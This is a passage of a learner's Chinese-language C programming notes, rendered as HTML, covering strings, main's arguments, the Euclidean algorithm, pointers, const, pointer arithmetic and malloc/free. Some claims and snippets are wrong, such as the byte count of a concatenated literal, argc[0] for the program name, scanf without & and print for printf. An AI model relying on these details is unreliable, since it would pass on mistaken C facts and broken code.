data-num=\"12\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这是因为<strong>字符串函数的操作都是以 \\0 作为结束</strong>，所以这里实际上是提前结束了 s 字符串</p>\n<h6 id=\"strstr\"><a class=\"anchor\" href=\"#strstr\">#</a> strstr:</h6>\n<p>还有 strcasestr (不区分大小写的查找)</p>\n<p><strong>基本格式</strong>：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s1<span class=\"token punctuation\">,</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token function\">strcasestr</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span>s1<span class=\"token punctuation\">,</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h5 id=\"字符串变量字面量\"><a class=\"anchor\" href=\"#字符串变量字面量\">#</a> 字符串变量 “字面量”</h5>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>str <span class=\"token operator\">=</span><span class=\"token string\">\"Hello\"</span><span class=\"token string\">\"World\"</span>   </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/* 实际上是六个字节，因为编译器会自动加 \\0。连续的字符串会自动拼成一个</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>等价于。这种写法等同于上面那个字符串的写法（编译后）。*/</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>str <span class=\"token operator\">=</span><span class=\"token string\">\"Hello\\</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>World\"</span>   <span class=\"token comment\">// 注意，这样上下俩行的连接会带上 Tab, 这样防止太长，不好看。</span></pre></td></tr></table></figure><p>但是<strong>不能用字符串来运算</strong></p>\n<p>字符串数组前<strong>默认有 const</strong>, 不能修改</p>\n<p>在编译时就已经确定，如果存在字面量相同的，那么会指向同一个地方</p>\n<p>想要修改，就只能是普通的字符数组（实际上它们储存的位置都不一样）</p>\n<p><img loading=\"lazy\" data-src=\"1729425745879.png\" alt=\"1729425745879\" /></p>\n<p><strong>char * 不一定是指向字符串，它也可以用来指向普通的字符数组，</strong></p>\n<p><strong>用它来直接定义的，一定是字符串（这一句必需初始化，否则只是普通的指针）。</strong>（不能是空指针）</p>\n<p>字符串数组输出时，用 % s</p>\n<blockquote>\n<p>一个 % s 只会读到空格前，继续输出才行。</p>\n<p>// 这是不安全的，因为不知道实际输入可能有多长，可能发生数组越界</p>\n<p>限制输入可以用 %7s (表示最多读 7 个，多余的会放到下一个 scanf（如有），这意味着可以不用回车同时输入上下多个 scanf), 但是若某一个要输入的长度小于 7，必需在输入完这个后回车再继续</p>\n</blockquote>\n<h6 id=\"main函数的参数\"><a class=\"anchor\" href=\"#main函数的参数\">#</a> main 函数的参数：</h6>\n<p><img loading=\"lazy\" data-src=\"1729428005682.png\" alt=\"1729428005682\" /></p>\n<p>argc [0]: 一定是 a.out（该程序名）, 程序刚开始时的输入会放到后面（空格分隔）</p>\n<p><img loading=\"lazy\" data-src=\"1729428257169.png\" alt=\"1729428257169\" /></p>\n<p>这是使用符号链接来启动程序（符号版快捷方式？）</p>\n<h1 id=\"iii不知道是什么\"><a class=\"anchor\" href=\"#iii不知道是什么\">#</a> Ⅲ. 不知道是什么</h1>\n<h4 id=\"一辗转相除法\"><a class=\"anchor\" href=\"#一辗转相除法\">#</a> 一。辗转相除法</h4>\n<p>(更为高效)</p>\n<p>算法内容：</p>\n<p>如果 b=0，计算结束，a 就是最大公约数，否则，计算 a 除以 b 的余数，让 a=b, 而 b</p>\n<p>等于那个余数，回到第一步</p>\n<p>演示：</p>\n<p>a\tb\tt</p>\n<p>12   18   12           // 这里实现了交换</p>\n<p>18    12    6</p>\n<p>12     6     0</p>\n<p>6        0</p>\n<p>所以，最大公约数是 6</p>\n<h1 id=\"iv指针\"><a class=\"anchor\" href=\"#iv指针\">#</a> Ⅳ.<a href=\"%E6%B0%B4%E5%86%B7\"> 指针</a></h1>\n<h1 id=\"从入门到放弃\"><a class=\"anchor\" href=\"#从入门到放弃\">#</a> 从入门到<a href=\"%E7%90%86%E8%B5%94\">放弃</a></h1>\n<h3 id=\"1取址符\"><a class=\"anchor\" href=\"#1取址符\">#</a> 1. 取址符 (&amp;)</h3>\n<pre><code>int i=&amp;i    //会有warning,强制类型转换可以消除\n//在64位下typeof(&amp;i)是8个字节，32位下和int一样4字节\n地址输出用%p\n</code></pre>\n<p>取地址不能有<strong>运算</strong></p>\n<p>数组的指针默认是指向第一个元素的地址，数组在内存中是连续的。</p>\n<blockquote>\n<p>数组越界，要传递数组大小，就是因为数组本身就是一个指针，没有边界检查。</p>\n</blockquote>\n<h3 id=\"2指针类型的变量\"><a class=\"anchor\" href=\"#2指针类型的变量\">#</a> 2. 指针类型的<strong>变量</strong></h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>i    <span class=\"token comment\">//p 在内存中得到的是 i 的地址，称为 p 指向 i</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span><span class=\"token operator\">*</span> p<span class=\"token punctuation\">,</span>q和<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>p<span class=\"token punctuation\">,</span>q 是一样的，此时q都是普通的<span class=\"token keyword\">int</span>  <span class=\"token comment\">// 不存在 int * 类型！！</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    定义只再次使用<span class=\"token operator\">*</span>p就是解引用，值为指向的地址的内容这里类型就是<span class=\"token keyword\">int</span>（每次都要）。</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"1728812248575.png\" alt=\"1728812248575\" /></p>\n<p>*p 就是 i, 这样就可以访问外面的变量</p>\n<p>scanf 就是把你传入的数据写到那个变量的地址上，如果不加 &amp;，会把变量名当作地址，写到别的地方去（没有类型检查）</p>\n<h3 id=\"3指针使用\"><a class=\"anchor\" href=\"#3指针使用\">#</a> 3. 指针使用</h3>\n<h4 id=\"1在函数中交换变量\"><a class=\"anchor\" href=\"#1在函数中交换变量\">#</a> 1. 在函数中交换变量</h4>\n<p>使用 * 变量就可以间接对 main 函数的变量改变</p>\n<p><img loading=\"lazy\" data-src=\"1728812654340.png\" alt=\"1728812654340\" /></p>\n<p><strong>指针常用于返回值，尤其是多个 (return 只能返回一个)</strong></p>\n<p><strong>为了区分返回，函数返回状态值，指针返回数据值</strong> (所以最后常来 return 0)</p>\n<p>注意：</p>\n<p><em><strong>*p 必须先指向一个变量，再 * p 赋值，否则那个值会被当成是地址</strong></em></p>\n<h4 id=\"2传入数组\"><a class=\"anchor\" href=\"#2传入数组\">#</a> 2. 传入数组</h4>\n<p>传入的实际上不是数组，而是指向这个数组的指针 (C 语言中只能传数值是这样的)</p>\n<p>函数参数表中的数组，实际上是个指针，在 [] 中写东西，是完全没有用的</p>\n<p>这就是说，你可以直接将数组传入一个指针</p>\n<p><img loading=\"lazy\" data-src=\"1728813490503.png\" alt=\"1728813490503\" /></p>\n<p>数组变量是一个特殊的<strong>指针</strong>，单个单元都是<strong>变量</strong>，而且在内存中是连续的（与指针数组不一样）</p>\n<p>数组 = const 指针 (所以数组不能互相赋值)</p>\n<p>int b []-----int const *b，此时不能用 b++,</p>\n<blockquote>\n<p>在 C99 中：</p>\n<p>被 const 的指针指向的变量可以变，但是不能是通过 const 指针</p>\n</blockquote>\n<pre><code>int i;\nconst int* p1 = &amp;i;    //实际上是const *p,也就是*p/i（解引后的值）不能改，但是p（地址）可以改\nint const* p2 = &amp;i;    //同上\nint *const p3 = &amp;i;    //p（地址）不能改，但是*p/i可以\n</code></pre>\n<p>const int b []: 表示里面的所有都是常量，这可以在变量原型中写，就不会改变传入数组的值</p>\n<h4 id=\"3指针运算\"><a class=\"anchor\" href=\"#3指针运算\">#</a> 3. 指针运算</h4>\n<h5 id=\"-\"><a class=\"anchor\" href=\"#-\">#</a> +，-</h5>\n<p>p++, 实际上是加了一个类型的大小 (+1 就是加一个类型大小，sizeof)</p>\n<p>*p++(常用于数组类的连续操作)： <code>++</code>  的优先级比解引用操作符  <code>*</code>  的优先级高。在表达式  <code>*p++</code>  中， <code>++</code>  操作符会先于  <code>*</code>  操作符被执行。这意味着  <code>p</code>  指针首先会增加，然后  <code>*</code>  操作符会解引用增加后的指针。</p>\n<p>但是，由于  <code>p++</code>  是一个后缀递增操作符，它返回的是递增前的指针值。所以，即使  <code>p</code>  指针在  <code>*</code>  操作之前已经递增了， <code>*p++</code>  表达式仍然会返回递增前的指针指向的值。</p>\n<p>人话：表达式的值还是 * p, 但是这句之后指针指向 *(p+1)</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">*</span>q<span class=\"token operator\">=</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>   <span class=\"token comment\">//* 是单目运算符，所以加 ()</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>指针也可以相减，是两者之间的距离（地址差<span class=\"token operator\">/</span><span class=\"token keyword\">sizeof</span>）</pre></td></tr></table></figure><h5 id=\"其他运算\"><a class=\"anchor\" href=\"#其他运算\">#</a> 其他运算</h5>\n<p>&lt;，&lt;=，==，&gt;，&gt;=，!=(地址大小比较，数组是递增排列的)</p>\n<h5 id=\"0地址\"><a class=\"anchor\" href=\"#0地址\">#</a> 0 地址</h5>\n<p><img loading=\"lazy\" data-src=\"1728820093755.png\" alt=\"1728820093755\" /></p>\n<p>所有进程都有 0 地址（都是虚拟地址），也是不能写的，有的系统，不能读。</p>\n<p>特殊事情包括：1. 初始化（没赋值就崩溃）</p>\n<p>​                           2. 返回值（这事成不了！）</p>\n<p>NULL: 必须全大写，有的编译器只能用 NULL，0 和 NULL 反而不一样</p>\n<h5 id=\"赋值\"><a class=\"anchor\" href=\"#赋值\">#</a> 赋值</h5>\n<p>必需同类型，因为不同类型的 sizeof 不一样。</p>\n<h4 id=\"4指针类型转化\"><a class=\"anchor\" href=\"#4指针类型转化\">#</a> 4. 指针类型转化</h4>\n<p><img loading=\"lazy\" data-src=\"1728821034165.png\" alt=\"1728821034165\" /></p>\n<p>注：强制类型转化的作用都只限于该句</p>\n<h4 id=\"5指针用处\"><a class=\"anchor\" href=\"#5指针用处\">#</a> 5. 指针用处</h4>\n<p><img loading=\"lazy\" data-src=\"1728821145218.png\" alt=\"1728821145218\" /></p>\n<h3 id=\"4动态内存分配\"><a class=\"anchor\" href=\"#4动态内存分配\">#</a> 4. 动态内存分配</h3>\n<p>1.malloc()</p>\n<p>C99 之前不能用变量定义数组大小，所以：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//malloc, 用于分配内存，需要 & lt;stdlib.h></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 用法：</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span> size<span class=\"token punctuation\">)</span>    <span class=\"token comment\">// 不能传递类型，所以 sizeof (以字节为单位)，返回的是 void*,(int*）// 上面就是指针赋值，前面用于指定类型 (这样才能赋值)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                       <span class=\"token comment\">// 就是在转化</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>然后就可以当数组了</pre></td></tr></table></figure><p>如果申请空间失败，会返回 0 或者 NULL，还能用于推出循环，比如</p>\n<p><img loading=\"lazy\" data-src=\"1728821974878.png\" alt=\"1728821974878\" /></p>\n<p><strong>会报错，但是不会终止程序，还会向下进行。</strong></p>\n<p>2.free()</p>\n<p>只能还申请空间 (不是申请的不行) 的首地址，否则会报错并终止（有运算也地搞回来）</p>\n<p>free (NULL)：什么事情都不会发生，因为指针一般习惯上会初始化为 0，要是没用到，也不会报错</p>\n<p><strong>切记：malloc () 最后一定要接 free ()</strong>, 但是不要再次 free</p>\n<h3 id=\"extra\"><a class=\"anchor\" href=\"#extra\">#</a> EXTRA</h3>\n<p>来自菜鸟教程 (?)</p>\n<h4 id=\"指针数组\"><a class=\"anchor\" href=\"#指针数组\">#</a> 指针数组：</h4>\n<p>把 <strong>ptr</strong> 声明为一个数组，由 MAX 个整数指针组成。因此，ptr 中的每个元素，都是一个指向 int 值的指针。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">const</span> <span class=\"token keyword\">int</span> MAX <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">int</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token keyword\">int</span>  var<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>ptr<span class=\"token punctuation\">[</span>MAX<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> MAX<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      ptr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>var<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 赋值为整数的地址 */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> MAX<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Value of var[%d] = %d\\n\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>ptr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>还可以有字符串指针数组</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"World\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aadfdfefcrverg\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">//a[1]=Hello,a[2]=World...</span></pre></td></tr></table></figure><p>也可以用一个指向字符的指针数组来存储一个字符串列表，如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token keyword\">int</span> MAX <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>names<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>       <span class=\"token string\">\"Zara Ali\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>       <span class=\"token string\">\"Hina Ali\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>       <span class=\"token string\">\"Nuha Ali\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>       <span class=\"token string\">\"Sara Ali\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> MAX<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Value of names[%d] = %s\\n\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> names<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这跟普通数组相比，地址是不连续的，运算方法一样。</p>\n<p>字符指针数组可以达到和枚举相似的效果：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"bpple\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"cpple\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 这样就可以将数字 (作为索引) 对应上字符串</span></pre></td></tr></table></figure><h4 id=\"指向指针的指针\"><a class=\"anchor\" href=\"#指向指针的指针\">#</a> 指向指针的指针：</h4>\n<p>纯套娃，定义就是 int **var 等</p>\n<p>这种变量解引用一次后得到的就是被指向的指针，仍然是个地址</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token keyword\">int</span>  V<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token keyword\">int</span>  <span class=\"token operator\">*</span>Pt1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token keyword\">int</span>  <span class=\"token operator\">*</span><span class=\"token operator\">*</span>Pt2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   V <span class=\"token operator\">=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token comment\">/* 获取 V 的地址 */</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   Pt1 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>V<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token comment\">/* 使用运算符 &amp; 获取 Pt1 的地址 */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   Pt2 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>Pt1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token comment\">/* 使用 pptr 获取值 */</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"var = %d\\n\"</span><span class=\"token punctuation\">,</span> V <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Pt1 = %p\\n\"</span><span class=\"token punctuation\">,</span> Pt1 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*Pt1 = %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>Pt1 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Pt2 = %p\\n\"</span><span class=\"token punctuation\">,</span> Pt2 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"**Pt2 = %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>Pt2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"返回指针的函数\"><a class=\"anchor\" href=\"#返回指针的函数\">#</a> <strong>返回指针的函数：</strong></h4>\n<p>定义：int * myFunction ()</p>\n<p>C 语言不支持在调用函数时返回局部变量的地址，除非定义局部变量为 <strong>static</strong> 变量</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;time.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span> </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">/* 要生成和返回随机数的函数 */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span> <span class=\"token function\">getRandom</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span>  r<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>             <span class=\"token comment\">// 这样结束后只是不可见，不会销毁，可以传递其值</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token comment\">/* 设置种子 */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span><span class=\"token punctuation\">)</span><span class=\"token function\">time</span><span 